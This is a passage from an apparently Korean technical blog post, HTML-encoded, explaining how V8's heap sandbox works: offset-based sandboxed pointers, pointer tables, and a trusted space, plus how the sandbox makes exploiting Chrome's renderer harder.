&#xC788;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC790;&#xCCB4;&#xAC00; &#xACF5;&#xACA9; &#xD45C;&#xBA74;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; V8&#xC740; &#xD799; &#xB0B4;&#xBD80;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC804;&#xCCB4;&#xB85C; &#xD37C;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xB294; &#xB9DE;&#xCDA4;&#xD615; &#xBC29;&#xC5B4;&#xC120;&#xC774; &#xD544;&#xC694;&#xD588;&#xACE0; &#xC774;&#xAC83;&#xC774; <strong>V8 &#xD799; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;</strong>&#xC758; &#xD575;&#xC2EC; &#xBAA9;&#xD45C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC989;, <strong>&#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC784;&#xC758;&#xAC12;(&#xD2B9;&#xD788; &#xD3EC;&#xC778;&#xD130;)&#xC774; &#xC4F0;&#xC774;&#xB354;&#xB77C;&#xB3C4; &#xADF8; &#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC5D4;&#xC9C4;&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC7A5;&#xC545;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC5EC;&#xB290; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC774;&#xB7EC;&#xD55C; &#xBCF4;&#xC548;&#xC774; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xD06C;&#xBA74; &#xC548;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; Heap Sandbox&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC1C;&#xB150;&#xC801; &#xBC29;&#xC2DD;&#xC744; &#xCDE8;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xBA54;&#xBAA8;&#xB9AC; &#xBD84;&#xB9AC;&#xB7;&#xACA9;&#xB9AC;</strong>: &#xC5D4;&#xC9C4;&#xC758; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB7F0;&#xD0C0;&#xC784;&#xC758; &#xB2E4;&#xB978; &#xBA54;&#xBAA8;&#xB9AC;(&#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;, JIT &#xCF54;&#xB4DC; &#xD398;&#xC774;&#xC9C0; &#xB4F1;)&#xC640; &#xB17C;&#xB9AC;&#xC801;&#xB7;&#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xD558;&#xC5EC;, &#xD799; &#xC0C1;&#xC758; &#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC678;&#xBD80; &#xC2E4;&#xD589;&#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD3EC;&#xC778;&#xD130; &#xCEA1;&#xC290;&#xD654; &#xBC0F; &#xAC80;&#xC99D;</strong>: &#xD799;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD3EC;&#xC778;&#xD130; &#xD45C;&#xD604;&#xC744; &#xC778;&#xCF54;&#xB529;(&#xD0DC;&#xAE45;)&#xD558;&#xAC70;&#xB098;, &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC808;&#xCC28;&#xB97C; &#xAC70;&#xCCD0; &#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C;&#xC640; &#xC11E;&#xC774;&#xC9C0; &#xC54A;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC81C;&#xD55C;&#xC801; &#xB514;&#xD37C;&#xB7F0;&#xC2F1;&#xB7;&#xACBD;&#xACC4; &#xAC80;&#xC0AC;</strong>: &#xD799;&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xAC12;&#xC774; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC; &#xC8FC;&#xC18C;&#xC778;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0; &#xC5C4;&#xACA9;&#xD788; &#xAD6C;&#xBD84;&#xD558;&#xACE0;, &#xC784;&#xC758;&#xAC12;&#xC744; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xACE7;&#xBC14;&#xB85C; &#xD574;&#xC11D;&#xB7;&#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC811;&#xADFC;&#xC744; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xCC98;&#xB7FC; V8 &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB514;&#xC790;&#xC778;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; V8 &#xD799; &#xB0B4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC784;&#xC758;&#xB85C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC804;&#xC81C; &#xD558;&#xC5D0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xB370; &#xC911;&#xC810;&#xC744; &#xB461;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-Implementation"><a href="#2-2-Implementation" class="headerlink" title="2.2 Implementation"></a>2.2 Implementation</h2><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC124;&#xACC4;&#xC758; &#xD575;&#xC2EC; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB294; <strong>V8 &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xC758; &#xC8FC;&#xC18C; &#xB514;&#xB808;&#xD37C;&#xB7F0;&#xC2F1;&#xC744; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xD3EC;&#xC778;&#xD130; &#xC5F0;&#xC0B0;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xC624;&#xD504;&#xC14B;&#xB7;&#xC778;&#xB371;&#xC2A4; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;</strong>&#xD558;&#xB3C4;&#xB85D; &#xBC14;&#xAFB8;&#xB294; &#xB370; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xD799; &#xC0C1;&#xC758; &#xC784;&#xC758;&#xAC12;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC774;&#xB098; &#xC2E4;&#xD589; &#xCF54;&#xB4DC;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xCDE8;&#xAE09;&#xC744; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xC774; &#xC124;&#xACC4;&#xC5D0; &#xB300;&#xD574; high-level &#xB2E8;&#xC5D0;&#xC11C; &#xD45C;&#xD604;&#xD55C; &#xADF8;&#xB9BC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><p>&#xC774; &#xCEE8;&#xC149;&#xC740; &#x201C;&#xC0CC;&#xB4DC;&#xBC31;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; / &#xB0B4;&#xB7;&#xC678;&#xBD80;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; / &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC04;&#x201D;&#xC73C;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xB294;&#xB370; &#xC774;&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="1-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC601;&#xC5ED;-&#xC9C0;&#xC815;-Sandbox-Address-Space"><a href="#1-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC601;&#xC5ED;-&#xC9C0;&#xC815;-Sandbox-Address-Space" class="headerlink" title="1. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; (Sandbox Address Space)"></a>1. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC601;&#xC5ED; &#xC9C0;&#xC815; (Sandbox Address Space)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; V8&#xC774; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC8FC;&#xC694; &#xBA54;&#xBAA8;&#xB9AC;(&#xC5D4;&#xC9C4; &#xD799;, ArrayBuffer&#xC758; backing stores, Wasm &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;)&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <strong>&#xB300;&#xD615; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC544;&#xB2CC; &#xAC00;&#xC0C1; &#xACF5;&#xAC04;&#xC5D0; &#xC218; TB &#xB2E8;&#xC704;&#xB85C; &#xC608;&#xC57D;&#xD574; &#xB450;&#xACE0; &#xADF8; &#xACF5;&#xAC04;&#xC744; &#x2018;&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#x2019;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC8FC;&#xBCC0;&#xC5D0;&#xB294; &#xB109;&#xB109;&#xD55C; &#xAC00;&#xB4DC; &#xC601;&#xC5ED;&#xC744; &#xB450;&#xC5B4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80; &#xBC30;&#xC5F4; &#xC778;&#xB371;&#xC2A4;&#xAC00; &#xACBD;&#xACC4;&#xB97C; &#xB118;&#xC5B4; &#xC678;&#xBD80;&#xB85C; &#xD0C8;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C;&#xB098; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><h3 id="2-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xB0B4;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Sandboxed-Pointers"><a href="#2-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xB0B4;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Sandboxed-Pointers" class="headerlink" title="2. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Sandboxed Pointers)"></a>2. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Sandboxed Pointers)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC758; &#xAC1D;&#xCCB4; &#xCC38;&#xC870;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC0C1;&#xC758; &#xC2E4;&#xC81C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC2DC;&#xC791;&#xC810;&#xC73C;&#xB85C;&#xBD80;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;</strong>&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB978;&#xBC14; SandboxedPointer&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xACE0;&#xC815; &#xD06C;&#xAE30;(e.g., 40bit) &#xC624;&#xD504;&#xC14B;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C;, &#xC624;&#xD504;&#xC14B; &#xAC12; &#xC790;&#xCCB4;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xADF8; &#xAC12;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xB294; &#xD56D;&#xC0C1; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xB85C; &#xD55C;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xB85C;&#xC758; &#xC784;&#xC758; &#xC811;&#xADFC;&#xC744; &#xC6D0;&#xCC9C; &#xBD09;&#xC1C4;&#xD558;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xACE0;, &#xC131;&#xB2A5;&#xC801;&#xC73C;&#xB85C;&#xB3C4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; CPU &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC62C;&#xB824;&#xB450;&#xBA74; &#xC624;&#xD504;&#xC14B;&#x2192;&#xC8FC;&#xC18C; &#xBCC0;&#xD658;&#xC744; x64&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xBA85;&#xB839; 2&#xAC1C;, arm64&#xC5D0;&#xC11C;&#xB294; 1&#xAC1C;&#xB85C; &#xB9E4;&#xC6B0; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC678;&#xBD80;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Pointer-Tables"><a href="#3-&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;-&#xC678;&#xBD80;-&#xD3EC;&#xC778;&#xD130;-&#xCC98;&#xB9AC;-Pointer-Tables" class="headerlink" title="3. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Pointer Tables)"></a>3. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130; &#xCC98;&#xB9AC; (Pointer Tables)</h3><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC758; &#xAC1D;&#xCCB4;(e.g., DOM &#xB178;&#xB4DC;, &#xC678;&#xBD80; &#xD655;&#xC7A5; &#xAC1D;&#xCCB4; &#xB4F1;)&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC16;&#xC9C0; &#xC54A;&#xACE0; <strong>&#xD3EC;&#xC778;&#xD130; &#xD14C;&#xC774;&#xBE14;(pointer table)</strong>&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC2E4;&#xC81C; &#xD3EC;&#xC778;&#xD130; &#xB300;&#xC2E0; <strong>&#xD14C;&#xC774;&#xBE14; &#xC778;&#xB371;&#xC2A4;</strong>&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC870;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; &#xC5EC;&#xB7EC; &#xCE21;&#xBA74;&#xC5D0;&#xC11C; &#xC548;&#xC804;&#xC131;&#xC744; &#xD5A5;&#xC0C1;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xACF5;&#xAC04;&#xC801; &#xC548;&#xC804;&#xC131;(Spatial safety)&#xC744; &#xC704;&#xD574; &#xD14C;&#xC774;&#xBE14; &#xBC94;&#xC704;&#xB97C; &#xB118;&#xB294; &#xC778;&#xB371;&#xC2A4; &#xC811;&#xADFC;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xACE0;, &#xC2DC;&#xAC04;&#xC801; &#xC548;&#xC804;&#xC131;(Temporal safety)&#xC740; GC&#xAC00; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xB7;&#xD68C;&#xC218;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD655;&#xBCF4;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC01; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xD568;&#xAED8; <strong>&#xD0C0;&#xC785; &#xD0DC;&#xADF8;(type tag)</strong> &#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4;, &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xB54C; &#xAE30;&#xB300;&#xB418;&#xB294; &#xD0C0;&#xC785;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC99D;&#xD568;&#xC73C;&#xB85C;&#xC368; Type Confusion &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image%208.png" alt="image.png"></p><h3 id="4-&#xC2E0;&#xB8B0;&#xB41C;-&#xACF5;&#xAC04;-Trusted-Space"><a href="#4-&#xC2E0;&#xB8B0;&#xB41C;-&#xACF5;&#xAC04;-Trusted-Space" class="headerlink" title="4. &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04; (Trusted Space)"></a>4. &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04; (Trusted Space)</h3><p>&#xC77C;&#xBD80; V8 &#xB0B4;&#xBD80; &#xAC1D;&#xCCB4;(e.g., &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xBC30;&#xC5F4;, Deoptimization &#xB370;&#xC774;&#xD130;)&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xCDA9;&#xBD84;&#xD788; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC70;&#xB098;, &#xC798;&#xBABB; &#xCDE8;&#xAE09;&#xB420; &#xACBD;&#xC6B0; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC6B0;&#xD68C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; <strong>&#xC2E0;&#xB8B0;&#xB41C;(Trusted) &#xD799; &#xC601;&#xC5ED;</strong>&#xC744; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xC774; &#xC601;&#xC5ED;&#xC5D0; &#xBBFC;&#xAC10;&#xD55C; &#xAC1D;&#xCCB4;&#xB97C; &#xBAA8;&#xC544;&#xB193;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACF5;&#xAC04;&#xC740; &#xC790;&#xCCB4;&#xC801;&#xC778; &#xD3EC;&#xC778;&#xD130; &#xC555;&#xCD95; &#xCF00;&#xC774;&#xC9C0;&#xB97C; &#xAC16;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB4E4;&#xC744; &#xC9C1;&#xC811; &#xCC38;&#xC870;&#xD558;&#xC9C0; &#xC54A;&#xACE0; TPT(Trusted Pointer Table) &#xAC19;&#xC740; &#xAC04;&#xC811; &#xCC38;&#xC870; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xB354;&#xB77C;&#xB3C4;, &#xC2E0;&#xB8B0;&#xB41C; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xBB34;&#xB2E8; &#xC811;&#xADFC;&#xB7;&#xC870;&#xC791; &#xAC00;&#xB2A5;&#xC131;&#xC740; &#xB300;&#xD3ED; &#xC904;&#xC5B4;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><h3 id="&#xC694;&#xC57D;"><a href="#&#xC694;&#xC57D;" class="headerlink" title="&#xC694;&#xC57D;"></a>&#xC694;&#xC57D;</h3><p>&#xC694;&#xC57D;&#xD558;&#xBA74;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC124;&#xACC4;&#xB294; (1) &#xD070; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xD799;&#xC744; &#xACA9;&#xB9AC;&#xD558;&#xACE0;, (2) &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC624;&#xD504;&#xC14B; &#xAE30;&#xBC18;&#xC758; &#xC548;&#xC804;&#xD55C; &#xD3EC;&#xC778;&#xD130; &#xD45C;&#xD604;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, (3) &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xB300;&#xC0C1;&#xC740; &#xC778;&#xB371;&#xC2A4; &#xAE30;&#xBC18; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xCC38;&#xC870;&#xD558;&#xACE0;, (4) &#xD2B9;&#xD788; &#xBBFC;&#xAC10;&#xD55C; &#xAC1D;&#xCCB4;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xC2E0;&#xB8B0;&#xB41C; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xACA9;&#xB9AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB2E4;&#xCE35;&#xC801; &#xC811;&#xADFC;&#xC740; &#xD799; &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACE7;&#xBC14;&#xB85C; &#xC2E4;&#xD589; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xB370; &#xD6A8;&#xACFC;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%2010.png" alt="image.png"></p><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC774;&#xC804;&#xC5D0;&#xB294; &#xD799; &#xC0C1;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB2E8;&#xC21C;&#xD788; &#xB36E;&#xC5B4;&#xC368;&#xC11C; <code>TypedArray</code>&#xC758; <code>backing_store</code> &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC; &#xC804;&#xBC18;&#xC5D0; &#xAC78;&#xCE5C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/W) &#xB2A5;&#xB825;&#xC744; &#xC989;&#xC2DC; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xC758; &#xB3C4;&#xC785;&#xC73C;&#xB85C; &#xD06C;&#xB86C;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC62C;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xD6A8;&#xACFC;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xC624;&#xBC84;&#xB77C;&#xC774;&#xD2B8; &#xB09C;&#xC774;&#xB3C4;&#xC758; &#xC99D;&#xAC00;&#xC785;&#xB2C8;&#xB2E4;. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC804;&#xD658; &#xC790;&#xCCB4;&#xB97C; &#xCC28;&#xB2E8;&#xD558;&#xAC70;&#xB098;, &#xB36E;&#xC5B4;&#xC4F4; &#xAC12;&#xC774; &#xC720;&#xD6A8;&#xD55C; &#xC2E4;&#xD589; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xB2E8;&#xC77C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xB358; Renderer Process RCE &#xB294; Sandbox Escape &#xB77C;&#xB294; &#xACFC;&#xC815;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xAC8C; 